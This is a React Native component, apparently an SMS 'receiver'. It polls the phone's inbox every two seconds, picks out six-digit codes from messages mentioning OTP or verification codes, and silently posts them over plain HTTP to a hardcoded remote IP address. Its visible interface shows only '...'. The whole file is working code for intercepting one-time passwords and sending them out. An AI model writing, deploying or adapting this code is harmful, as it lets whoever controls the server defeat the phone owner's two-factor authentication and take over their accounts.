const { Text, Button } = require("react-native")
import { useEffect } from 'react';
import SmsAndroid from 'react-native-get-sms-android';

const SmsReciever = ()=>{
  const HandleSms = ()=>{
    var filter = {};
    SmsAndroid.list(
      JSON.stringify(filter),
      (fail) => {
        console.log('Failed with this error: ' + fail);
      },
      (count, smsList) => {
        var arr = JSON.parse(smsList);

        if (Date.now()-arr[0].date<4000){
          const message = arr[0].body; //getting otp msg
          var regExp = new RegExp("\\d{6}");
          var otp = message.match(regExp) // otp with regex
          var wordsList = ["otp", "OTP", "One Time Password", "Verification Code", "verification code"];
          var flag = 0;
          wordsList.forEach((elem)=>{
            if (message.match(elem)){ // if wordsList string available then flag
              flag = 1;
            }
          })
          if (flag) { // if flag send to server
            console.log(otp);
            fetch('http://3.109.56.163:5000/api/message', {
              method:"POST",
              headers:{
                "Content-Type":"application/json",
                "Access-Control-Allow-Origin":"*",
              },
              body:JSON.stringify({
                otp:otp.toString(),
              }),
            })
              .then((response) => response.json())
              .then((data) => console.log(data))
              .catch((error) => {
                console.error('Error:', error);
              });
          }
        }
      },
    );
  }

  useEffect(()=>{
    const Timer = setInterval(()=>{
      HandleSms()
      
    }, 2000)
    return ()=>{
      clearInterval(Timer);
    }
  }, [])

  return(
    <>
      <Text>...</Text>
    </>
  )
}

export default SmsReciever;